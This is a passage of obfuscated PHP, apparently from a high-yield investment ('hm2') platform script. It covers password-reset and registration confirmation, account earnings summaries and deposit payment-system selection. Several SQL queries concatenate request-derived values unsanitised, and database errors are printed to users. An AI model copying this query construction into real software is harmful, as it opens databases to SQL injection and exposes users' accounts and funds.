                $elnlcRuFoK[$elnlcsyENS['elnlcQEKp']] = $elnlcSuVc[$elnlcsyENS['elnlcbTGA']];
                elnlcsius ('brute_force_activation', $elnlcCgqPK[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
              }

              $elnlcRslN = elnlcshwnc (10);
              $q = '' . 'update hm2_users set password_confimation = \'' . $elnlcRslN . '\' where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
              mysql_query ($q);
              $elnlcRuFoK = array ();
              $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
              $elnlcRuFoK[$elnlcsyENS['elnlcuwIt']] = $elnlcRslN;
              $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcCgqPK[$elnlcsyENS['elnlcmjdk']];
              $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU['REMOTE_ADDR'];
              elnlcsius ('forgot_password_confirm', $elnlcCgqPK['email'], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
              $elnlcfhFg->assign ('user_found', 1);
            }

            $elnlcrAlEG = $elnlcsyENS['elnlcbpKgI'];
          }
        }

        $elnlcfhFg->assign ('errors', $elnlcjPews);
        $elnlcfhFg->assign ('found_records', $elnlcrAlEG);
        $elnlcfhFg->display ($elnlcsyENS['elnlcRNyK']);
      }
      else
      {
        if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlccRVS'] AND $elnlcSuVc[$elnlcsyENS['elnlcLUck']] == 1))
        {
          $elnlcWUJl = $elnlcsyENS['elnlcmjUx'];
          if ($elnlcWodOE[$elnlcsyENS['elnlcAlpp']] != '')
          {
            $elnlcRuFoK = array ();
            $elnlcxMzO = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcAlpp']]);
            $q = '' . 'select * from hm2_users where confirm_string = \'' . $elnlcxMzO . '\'';
            if (!($elnlchGkPU = mysql_query ($q)))
            {
              exit (mysql_error ());
              (bool)true;
            }

            while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
            {
              $elnlcWUJl = $elnlcsyENS['elnlctNxTK'];
              $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
              $elnlcRuFoK[$elnlcsyENS['elnlcuNxa']] = '********';
              $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcCgqPK[$elnlcsyENS['elnlcmjdk']];
              $elnlcRuFoK[$elnlcsyENS['elnlcdktEr']] = $elnlcCgqPK['email'];
              $elnlcRuFoK[$elnlcsyENS['elnlckGUEd']] = $elnlcCgqPK['ref'];
            }

            if ($elnlcWUJl == 1)
            {
              $q = '' . 'update hm2_users set confirm_string = \'\' where confirm_string = \'' . $elnlcxMzO . '\'';
              if (!(mysql_query ($q)))
              {
                exit (mysql_error ());
                (bool)true;
              }

              elnlcsius ('registration', $elnlcRuFoK['email'], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
              $elnlcFjFp = elnlcnczen ($elnlcRuFoK[$elnlcsyENS['elnlckGUEd']]);
              $q = '' . 'select * from hm2_users where id = \'' . $elnlcFjFp . '\'';
              $elnlchGkPU = mysql_query ($q);
              while ($elnlcbbeUe = mysql_fetch_array ($elnlchGkPU))
              {
                $elnlcWySv = array ();
                $elnlcWySv[$elnlcsyENS['elnlcmjdk']] = $elnlcbbeUe[$elnlcsyENS['elnlcmjdk']];
                $elnlcWySv[$elnlcsyENS['elnlczWew']] = $elnlcbbeUe[$elnlcsyENS['elnlczWew']];
                $elnlcWySv[$elnlcsyENS['elnlcpuuw']] = $elnlcRuFoK[$elnlcsyENS['elnlczWew']];
                $elnlcWySv[$elnlcsyENS['elnlcfoOq']] = $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']];
                $elnlcWySv[$elnlcsyENS['elnlczavvl']] = $elnlcRuFoK[$elnlcsyENS['elnlcdktEr']];
                elnlcsius ('direct_signup_notification', $elnlcbbeUe['email'], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcWySv);
              }
            }
          }

          $elnlcfhFg->assign ('success', $elnlcWUJl);
          $elnlcfhFg->display ($elnlcsyENS['elnlcSBmd']);
        }
        else
        {
          if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcfHet'])
          {
            if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcWxHP'])
            {
              $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] = $elnlcsyENS['elnlcmjUx'];
              $elnlcfhFg->assign ('settings', $elnlcSuVc);
            }

            $elnlcfhFg->assign ('frm', $elnlcWodOE);
            $elnlcfhFg->display ($elnlcsyENS['elnlcVcbI']);
            print base64_decode ('Cgo=
');
          }
          else
          {
            if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcFsFdN'] OR $elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcnVDv']) AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
            {
              $elnlckapu = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
              $q = 'select ip, date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%b-%e-%Y %r\') as last_login from hm2_user_access_log where user_id = ' . $elnlckapu . ' order by id desc limit 1, 5');
              $elnlchGkPU = mysql_query ($q);
              $i = $elnlcsyENS['elnlcmjUx'];
              $elnlcnLtDg = array ();
              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
              {
                if ($i == 0)
                {
                  $elnlcfhFg->assign ('last_access', $elnlcCgqPK[$elnlcsyENS['elnlcRheS']]);
                  $elnlcfhFg->assign ('last_ip', $elnlcCgqPK[$elnlcsyENS['elnlctDSvC']]);
                }

                ++$i;
                array_push ($elnlcnLtDg, array ('ip' => $elnlcCgqPK[$elnlcsyENS['elnlctDSvC']], 'time' => $elnlcCgqPK[$elnlcsyENS['elnlcRheS']]));
              }

              $elnlcfhFg->assign ('last5_access', $elnlcnLtDg);
              if ($elnlcSuVc[$elnlcsyENS['elnlcTbVBq']] == 1)
              {
                $q = '' . 'select * from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                $elnlcBEHn = $elnlcsyENS['elnlcmjUx'];
                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                {
                  $q = '' . 'select sum(actual_amount) as sum from hm2_history where deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . ' and type=\'earning\'';
                  ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                  while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                  {
                    $elnlcBEHn += $elnlcUpbus[$elnlcsyENS['elnlcHSGM']];
                  }
                }

                $q = '' . 'select hm2_deposits.*, to_days(now()) - to_days(last_pay_date) as cnt, hm2_types.period from hm2_deposits, hm2_types where hm2_types.id = hm2_deposits.type_id and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and hm2_deposits.status=\'on\'';
                ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                {
                  $q = '' . 'select * from hm2_plans where parent=' . $elnlcCgqPK[$elnlcsyENS['elnlcPfzD']] . ' and ' . $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] . ' > min_deposit order by min_deposit desc limit 1';
                  ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                  while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                  {
                    $d = $elnlcsyENS['elnlcmjUx'];
                    if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcaeKEf'])
                    {
                      $d = $elnlcsyENS['elnlctNxTK'];
                    }

                    if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcwGlL'])
                    {
                      $d = $elnlcsyENS['elnlciIAFv'];
                    }

                    if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == 'b-w')
                    {
                      $d = $elnlcsyENS['elnlcpddvM'];
                    }

                    if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcGPcC'])
                    {
                      $d = $elnlcsyENS['elnlcddJpj'];
                    }

                    if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcclPO'])
                    {
                      $d = $elnlcsyENS['elnlcSxTvx'];
                    }

                    if (0 < $d)
                    {
                      $elnlcBEHn += $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] * $elnlcCgqPK[cnt] * $elnlcUpbus[$elnlcsyENS['elnlcOhvjC']] / (100 * $d);
                      continue;
                    }
                  }
                }

                $elnlcfhFg->assign ('earned_est', number_format ($elnlcBEHn, 2));
              }

              $elnlcotDB = elnlcmext ($elnlckapu);
              $elnlcTshQ = array ();
              $elnlcotDB[$elnlcsyENS['elnlcOBsC']] = 0 - $elnlcotDB[$elnlcsyENS['elnlcOBsC']];
              $elnlcotDB[$elnlcsyENS['elnlczFIo']] = $elnlcotDB[$elnlcsyENS['elnlczFIo']];
              $elnlcotDB[$elnlcsyENS['elnlcbzLT']] = 0 - $elnlcotDB[$elnlcsyENS['elnlcbzLT']];
              $elnlcotDB[$elnlcsyENS['elnlcKCaAM']] = 0 - $elnlcotDB[$elnlcsyENS['elnlcKCaAM']];
              reset ($elnlcotDB);
              while (list ($elnlcuwppG, $elnlcOBJb) = each ($elnlcotDB))
              {
                $elnlcTshQ[$elnlcuwppG] = number_format ($elnlcOBJb, 2);
              }

              $elnlcfhFg->assign ('ab_formated', $elnlcTshQ);
              $q = '' . 'select count(id) as col, sum(amount) as actual_amount, ec from hm2_pending_deposits where user_id = ' . $elnlckapu . ' and status != \'processed\' group by ec';
              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
              {
                $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcdBhdK']] = $elnlcCgqPK[$elnlcsyENS['elnlckNCf']];
                $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcnsJjv']] = number_format ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']], 2);
              }

              $q = 'select sum(actual_amount) as sm, ec from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' group by ec';
              $elnlchGkPU = mysql_query ($q);
              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
              {
                $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcTcMv']] = number_format ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']], 2);
              }

              $elnlcQTTo = array ();
              reset ($elnlcGPfS);
              foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
              {
                $elnlcoFEhc[$elnlcsyENS['elnlcLbvLL']] = $elnlckapu;
                array_push ($elnlcQTTo, $elnlcoFEhc);
              }

              $elnlcfhFg->assign ('ps', $elnlcQTTo);
              $elnlckapu = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
              $q = 'select *, date_format(deposit_date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%b-%e-%Y %r\') as dd from hm2_deposits where user_id = ' . $elnlckapu . ' order by deposit_date desc limit 1');
              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
              if ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
              {
                $elnlcfhFg->assign ('last_deposit', number_format ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']], 2));
                $elnlcfhFg->assign ('last_deposit_date', $elnlcCgqPK[$elnlcsyENS['elnlcfCcW']]);
              }

              $q = 'select *, date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%b-%e-%Y %r\') as dd from hm2_history where user_id = ' . $elnlckapu . ' and type = \'withdrawal\' order by date desc limit 1');
              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
              if ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
              {
                $elnlcfhFg->assign ('last_withdrawal', number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]), 2));
                $elnlcfhFg->assign ('last_withdrawal_date', $elnlcCgqPK[$elnlcsyENS['elnlcfCcW']]);
              }

              $q = '' . 'select count(id) as col from hm2_wires where user_id = ' . $elnlckapu . ' and status != \'processed\'';
              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
              if ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
              {
                $elnlcfhFg->assign ('wires', $elnlcCgqPK[$elnlcsyENS['elnlckNCf']]);
              }

              $elnlcfhFg->display ($elnlcsyENS['elnlcNjRAV']);
              print base64_decode ('Cg==
');
            }
            else
            {
              if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcULrED'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
              {
                if ((($elnlcUAAU[HTTP_HOST] == 'www.czemoney.com' OR $elnlcUAAU[HTTP_HOST] == 'czemoney.com') AND date ('D') != 'Mon'))
                {
                  $elnlcfhFg->display ($elnlcsyENS['elnlcBKyw']);
                }

                $elnlcweII = array ('d' => 'Daily', 'w' => 'Weekly', 'b-w' => 'Bi Weekly', 'm' => 'Monthly', '2m' => '2 Monthly', '3m' => '3 Monthly', '6m' => '6 Monthly', 'h' => 'Hourly', 'y' => $elnlcsyENS['elnlcRzpur']);
                $elnlcotDB = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                $elnlcTshQ = array ();
                while (list ($elnlcuwppG, $elnlcOBJb) = each ($elnlcotDB))
                {
                  $elnlcTshQ[$elnlcuwppG] = number_format ($elnlcOBJb, 2);
                }

                $elnlcfhFg->assign ('ab_formated', $elnlcTshQ);
                $elnlcfhFg->assign ('frm', $elnlcWodOE);
                $elnlcQTTo = substr ($elnlcWodOE[$elnlcsyENS['elnlcsMIe']], 8);
                $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcSzzCf']]);
                if ((($elnlcWodOE[$elnlcsyENS['elnlcsMIe']] != '' AND $elnlcpazb != 0) AND $elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlccotiB']] == 1))
                {
                  if ((($elnlcSuVc[$elnlcsyENS['elnlcgkyj']] AND $elnlcpazb == -1) AND 0.0100000000000000002081668 <= $elnlcrUqv))
                  {
                    $elnlcfhFg->assign ('h_id', -1);
                    $elnlcfhFg->assign ('amount', $elnlcrUqv);
                    $elnlcfhFg->assign ('amount_format', number_format ($elnlcrUqv, 2));
                    if ($elnlcQTTo == 0)
                    {
                      $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                      $elnlcfhFg->assign ('pid', $elnlcGxgf);
                      $elnlcfhFg->display ($elnlcsyENS['elnlcmUuS']);
                      print base64_decode ('Cg==
');
                    }
                    else
                    {
                      if ($elnlcQTTo == 1)
                      {
                        $elnlcfhFg->display ($elnlcsyENS['elnlcCaWmo']);
                      }
                      else
                      {
                        if ($elnlcQTTo == 2)
                        {
                          $elnlcfhFg->display ($elnlcsyENS['elnlcOxeuE']);
                        }
                        else
                        {
                          if ($elnlcQTTo == 4)
                          {
                            $elnlcfhFg->display ($elnlcsyENS['elnlcfUpoJ']);
                            print base64_decode ('Cg==
');
                          }
                          else
                          {
                            if ($elnlcQTTo == 5)
                            {
                              $elnlcfhFg->assign ('ps', $elnlcQTTo);
                              $elnlcfhFg->display ($elnlcsyENS['elnlcnJrR']);
                            }
                            else
                            {
                              if ($elnlcQTTo == 55)
                              {
                                $elnlcfhFg->assign ('ps', $elnlcQTTo);
                                $elnlcfhFg->display ($elnlcsyENS['elnlcnJrR']);
                              }
                              else
                              {
                                if ($elnlcQTTo == 6)
                                {
                                  $elnlcfhFg->display ($elnlcsyENS['elnlcNPAAe']);
                                  print base64_decode ('Cg==
');
                                }
                                else
                                {
                                  if ($elnlcQTTo == 7)
                                  {
                                    $elnlcfhFg->display ($elnlcsyENS['elnlcCavVy']);
                                    print base64_decode ('Cg==
');
                                  }
                                  else
                                  {
                                    if ($elnlcQTTo == 8)
                                    {
                                      $elnlcfhFg->display ($elnlcsyENS['elnlceTbc']);
                                    }
                                    else
                                    {
                                      if ($elnlcQTTo == 9)
                                      {
                                        $elnlcfhFg->display ($elnlcsyENS['elnlcefEa']);
                                        print base64_decode ('Cg==
');
                                      }
                                      else
                                      {
                                        if ($elnlcQTTo == 10)
                                        {
                                          $elnlcfhFg->display ($elnlcsyENS['elnlcKfPvd']);
                                          print base64_decode ('Cg==
');
                                        }
                                        else
                                        {
                                          if ($elnlcQTTo == 11)
                                          {
                                            $elnlcfhFg->display ($elnlcsyENS['elnlcWITk']);
                                            print base64_decode ('Cg==
');
                                          }
                                          else
                                          {
                                            if ($elnlcQTTo == 12)
                                            {
                                              $elnlcfhFg->display ($elnlcsyENS['elnlcwsvT']);
                                              print base64_decode ('Cg==
');
                                            }
                                            else
                                            {
                                              if ($elnlcQTTo == 15)
                                              {
                                                $elnlcfhFg->display ($elnlcsyENS['elnlcuKlbx']);
                                                print base64_decode ('Cg==
');
                                              }
                                              else
                                              {
                                                if ($elnlcQTTo == 16)
                                                {
                                                  $elnlcfhFg->display ($elnlcsyENS['elnlchaJwc']);
                                                  print base64_decode ('Cg==
');
                                                }
                                                else
                                                {
                                                  if ($elnlcQTTo == 17)
                                                  {
                                                    $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                    $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                    $elnlcfhFg->display ($elnlcsyENS['elnlcnlxV']);
                                                    print base64_decode ('Cg==
');
                                                  }
                                                  else
                                                  {
                                                    if ($elnlcQTTo == 18)
                                                    {
                                                      $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment', 'payment_system' => 'perfect_money'), 0);
                                                      $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcMWguV']);
                                                      print base64_decode ('Cg==
');
                                                    }
                                                    else
                                                    {
                                                      if ($elnlcQTTo == 19)
                                                      {
                                                        $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                        $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                        $elnlcfhFg->display ($elnlcsyENS['elnlciUJM']);
                                                        print base64_decode ('Cg==
');
                                                      }
                                                      else
                                                      {
                                                        if ($elnlcQTTo == 20)
                                                        {
                                                          $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                          $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                          $elnlcfhFg->display ($elnlcsyENS['elnlconHWo']);
                                                          print base64_decode ('Cg==
');
                                                        }
                                                        else
                                                        {
                                                          if ($elnlcQTTo == 21)
                                                          {
                                                            $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                            $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                            $elnlcfhFg->display ($elnlcsyENS['elnlcBjpfu']);
                                                            print base64_decode ('Cg==
');
                                                          }
                                                          else
                                                          {
                                                            if ($elnlcQTTo == 22)
                                                            {
                                                              $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                              $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                              $elnlcfhFg->display ($elnlcsyENS['elnlcnahVF']);
                                                              print base64_decode ('Cg==
');
                                                            }
                                                            else
                                                            {
                                                              if ($elnlcQTTo == 23)
                                                              {
                                                                $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                $elnlcfhFg->display ($elnlcsyENS['elnlczIwho']);
                                                                print base64_decode ('Cg==
');
                                                              }
                                                              else
                                                              {
                                                                if ($elnlcQTTo == 24)
                                                                {
                                                                  $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment', 'payment_system' => 'evowallet'), 0);
                                                                  $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                  $elnlcfhFg->display ($elnlcsyENS['elnlcKbeJa']);
                                                                  print base64_decode ('Cg==
');
                                                                }
                                                                else
                                                                {
                                                                  if ($elnlcQTTo == 25)
                                                                  {
                                                                    $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'payment_system' => 'remitfund'), 0);
                                                                    $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                    $elnlcfhFg->display ($elnlcsyENS['elnlcVhdta']);
                                                                    print base64_decode ('Cg==
');
                                                                  }
                                                                  else
                                                                  {
                                                                    if ($elnlcQTTo == 26)
                                                                    {
                                                                      $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                      $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcKbyS']);
                                                                      print base64_decode ('Cg==
');
                                                                    }
                                                                    else
                                                                    {
                                                                      if ($elnlcQTTo == 27)
                                                                      {
                                                                        $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                        $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                        $elnlcfhFg->display ($elnlcsyENS['elnlcezdi']);
                                                                        print base64_decode ('Cg==
');
                                                                      }
                                                                      else
                                                                      {
                                                                        if ($elnlcQTTo == 28)
                                                                        {
                                                                          $elnlcGxgf = elnlcqsjub (array ('userid' => $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], 'hyipid' => $elnlcpazb, 'a' => 'checkpayment'), 0);
                                                                          $elnlcfhFg->assign ('pid', $elnlcGxgf);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcKVgFe']);
                                                                          print base64_decode ('Cg==
');
                                                                        }
                                                                        else
                                                                        {
                                                                          $elnlcwedHs = $elnlcsyENS['elnlctNxTK'];
                                                                          $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                                                                          $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcSzzCf']]);
                                                                          $elnlcQTTo = substr ($elnlcWodOE[$elnlcsyENS['elnlcsMIe']], 8);
                                                                          $elnlcLOJT = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                                                                          if (($elnlcSuVc[use_add_funds] AND $elnlcpazb == -1))
                                                                          {
                                                                            if ($elnlcrUqv < 0.0100000000000000002081668)
                                                                            {
                                                                              $elnlcfhFg->assign ('zero_amount', 1);
                                                                              $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                                                                            }

                                                                            $elnlcButH = 'Deposit to Account';
                                                                          }
                                                                          else
                                                                          {
                                                                            $q = '' . 'select * from hm2_types where id = ' . $elnlcpazb . ' and closed = 0';
                                                                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                            $elnlcgNwD = mysql_fetch_array ($elnlchGkPU);
                                                                            if (!$elnlcgNwD)
                                                                            {
                                                                              $elnlcfhFg->assign ('wrong_plan', 1);
                                                                            }
                                                                            else
                                                                            {
                                                                              $elnlcButH = $elnlcgNwD[$elnlcsyENS['elnlcmjdk']];
                                                                              $elnlcfhFg->assign ('plan_name', $elnlcButH);
                                                                            }

                                                                            $elnlcxRMia = $elnlcsyENS['elnlcmjUx'];
                                                                            if ($elnlcgNwD[$elnlcsyENS['elnlcvNkQ']])
                                                                            {
                                                                              if ($elnlcgNwD[$elnlcsyENS['elnlcdzAd']] == 0)
                                                                              {
                                                                                $elnlcgNwD[$elnlcsyENS['elnlcdzAd']] = $elnlcrUqv + 1;
                                                                              }

                                                                              if (($elnlcgNwD[$elnlcsyENS['elnlcqQISr']] <= $elnlcrUqv AND $elnlcrUqv <= $elnlcgNwD[$elnlcsyENS['elnlcdzAd']]))
                                                                              {
                                                                                $elnlcxRMia = $elnlcsyENS['elnlctNxTK'];
                                                                                if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
                                                                                {
                                                                                  $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
                                                                                  $elnlcdALE = array ();
                                                                                  foreach ($elnlcnGUUn as $elnlcvRHDg)
                                                                                  {
                                                                                    array_push ($elnlcdALE, sprintf ('%d', $elnlcvRHDg));
                                                                                  }

                                                                                  sort ($elnlcdALE);
                                                                                  $elnlcqsuFJ = array ();
                                                                                  foreach ($elnlcdALE as $elnlcvRHDg)
                                                                                  {
                                                                                    array_push ($elnlcqsuFJ, array ('percent' => sprintf ('%d', $elnlcvRHDg)));
                                                                                  }

                                                                                  $elnlcfhFg->assign ('compound_percents', $elnlcqsuFJ);
                                                                                }
                                                                                else
                                                                                {
                                                                                  $elnlcfhFg->assign ('compound_min_percents', $elnlcgNwD[$elnlcsyENS['elnlcORJuw']]);
                                                                                  $elnlcfhFg->assign ('compound_max_percents', $elnlcgNwD[$elnlcsyENS['elnlcyDBs']]);
                                                                                }
                                                                              }
                                                                            }

                                                                            $elnlcfhFg->assign ('use_compound', $elnlcxRMia);
                                                                            $q = '' . 'select count(*) as col, min(min_deposit) as min from hm2_plans where parent = ' . $elnlcpazb;
                                                                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                            $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                                            if ($elnlcCgqPK)
                                                                            {
                                                                              if ($elnlcCgqPK[$elnlcsyENS['elnlckNCf']] == 0)
                                                                              {
                                                                                $elnlcfhFg->assign ('wrong_plan', 1);
                                                                                $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                                                                              }

                                                                              if ($elnlcrUqv < $elnlcCgqPK[$elnlcsyENS['elnlcisNwx']])
                                                                              {
                                                                                $elnlcfhFg->assign ('less_than_min', 1);
                                                                                $elnlcfhFg->assign ('min_amount', number_format ($elnlcCgqPK[$elnlcsyENS['elnlcisNwx']], 2));
                                                                                $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                                                                              }
                                                                            }
                                                                            else
                                                                            {
                                                                              $elnlcfhFg->assign ('wrong_plan', 1);
                                                                              $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                                                                            }

                                                                            $elnlcxdwm = $elnlcsyENS['elnlcmjUx'];
                                                                            $q = '' . 'select min(max_deposit) as min, max(max_deposit) as max from hm2_plans where parent = ' . $elnlcpazb;
                                                                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                            $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                                            if ($elnlcCgqPK)
                                                                            {
                                                                              if (0 < $elnlcCgqPK[$elnlcsyENS['elnlcisNwx']])
                                                                              {
                                                                                if ($elnlcCgqPK[$elnlcsyENS['elnlcRfuvo']] < $elnlcLOJT[$elnlcsyENS['elnlceleT']])
                                                                                {
                                                                                  $elnlcxdwm = $elnlcCgqPK[$elnlcsyENS['elnlcRfuvo']];
                                                                                }
                                                                              }
                                                                            }

                                                                            if (($elnlcxdwm < $elnlcrUqv AND 0 < $elnlcxdwm))
                                                                            {
                                                                              $elnlcfhFg->assign ('max_deposit_less', 1);
                                                                              $elnlcfhFg->assign ('max_deposit_format', number_format ($elnlcxdwm, 2));
                                                                              $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                                                                            }
                                                                          }

                                                                          $q = '' . 'select * from hm2_processings where id = ' . $elnlcQTTo;
                                                                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                          $elnlcQACRu = mysql_fetch_array ($elnlchGkPU);
                                                                          if (($elnlcwedHs == 1 AND $elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcpcHa']))
                                                                          {
